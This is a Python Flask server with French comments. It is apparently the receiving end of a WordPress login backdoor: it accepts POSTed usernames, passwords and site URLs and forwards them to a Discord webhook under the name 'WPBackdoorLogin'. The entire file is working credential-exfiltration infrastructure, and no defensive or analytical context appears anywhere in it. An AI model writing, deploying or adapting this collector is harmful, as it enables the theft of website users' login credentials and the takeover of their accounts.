import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

webhook = os.environ.get('WEBHOOK_HOST')

@app.route('/data', methods=['POST','OPTIONS'])
def handle_post():
    if request.method == 'OPTIONS':
        return '', 204 # Réponse vide "No Content" pour valider le Preflight

    req = request.get_json()
    
    try:
        from zoneinfo import ZoneInfo
    except ImportError:
        from backports.zoneinfo import ZoneInfo

    maintenant = datetime.now(ZoneInfo("Europe/Paris"))
    date_formatee = maintenant.strftime("%d/%m/%Y %H:%M")
        
    user = req.get('user')
    password = req.get('passw')
    title = "[Login Backdoor] -> "+req.get('origin')
    url = req.get('url')
    footer = "Submited the • "+date_formatee
    
    
    # Notification Discord
    data = {
        "username" : "WPBackdoorLogin"
    }

    data["embeds"] = [
        {
            "title" : title,
            "url": url,
            "fields": [
                {
                "name": "URL",
                "value": url,
                },
                {
                "name": "Username",
                "value": user,
                },
                {
                "name": "Password",
                "value": password,
                }
            ],
            "footer": {
                "text": footer,
            }
        }
    ]
    
    result = requests.post(webhook, json = data)

    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print(f"Payload delivered successfully, code {result.status_code}.")
    return jsonify({"statut": "success","webhook":webhook}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)